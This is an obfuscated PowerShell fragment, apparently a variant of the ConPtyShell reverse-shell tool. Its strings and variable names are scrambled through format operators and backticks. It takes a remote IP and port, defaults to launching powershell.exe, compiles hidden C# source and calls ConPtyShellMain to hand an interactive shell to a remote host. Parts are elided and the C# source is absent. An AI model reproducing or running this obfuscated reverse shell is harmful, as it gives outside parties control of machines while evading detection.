  &("{0}{1}"-f 'se','t')  gd21N  ([TYpe]("{2}{1}{0}{3}{4}{5}"-f'h','OnpTyS','c','e','llm','AInCLASs')  )  ;function r`ePO
{   
    ...
    (
        ...
        [Parameter()]
        [String]
        ${Co`mMa`N`DLIne} = ("{2}{0}{1}" -f'.','exe','powershell'),
    ...
    if( ${pSbOUN`DParaM`e`TErS}.("{0}{2}{1}{3}"-f'Co','insK','nta','ey').Invoke(("{2}{1}{0}"-f 'rade','g','Up')) ) {
        ${reM`Ot`eIP} = ("{0}{2}{1}" -f'up','ade','gr')
        ${ReM`o`TEpo`RT} = ("{1}{0}" -f'hell','s')
    }
    else{
  
        if(-Not(${pS`B`OUnD`PaRaM`eT`ERS}.("{3}{1}{0}{2}"-f'ins','ta','Key','Con').Invoke(("{0}{2}{1}"-f'Remot','Ip','e')))) {
            throw ("{3}{5}{4}{0}{1}{2}"-f'Ip missing',' paramet','er','Re','e','mot')
        }
        
        if(-Not(${P`SbOu`ND`param`EtE`RS}.("{0}{2}{1}" -f'Conta','Key','ins').Invoke(("{3}{2}{1}{0}"-f 'tePort','o','m','Re')))) {
            throw ("{0}{5}{3}{2}{4}{1}" -f'Rem','ter','missing ',' ','parame','otePort')
        }
    }
    Set-Variable -Name paRAmeTErsCONPTySHelL -Value (@(${RE`MOtEIP}, ${r`EmOTe`pOrT}, ${Ro`ws}, ${cO`LS}, ${c`om`MaNdline}))
    &("{2}{0}{1}" -f 'd-Typ','e','Ad') -TypeDefinition ${SO`U`RCe} -Language ("{1}{0}{2}"-f'Shar','C','p');
    Set-Variable -Name OutpUt -Value (${GD2`1N}::("{2}{3}{0}{1}{4}"-f'PtyShe','llMa','C','on','in').Invoke(${pA`RAmET`ERscONPty`She`Ll}))
    &("{2}{0}{1}" -f'ite','-Output','Wr') ${OUT`puT}
}
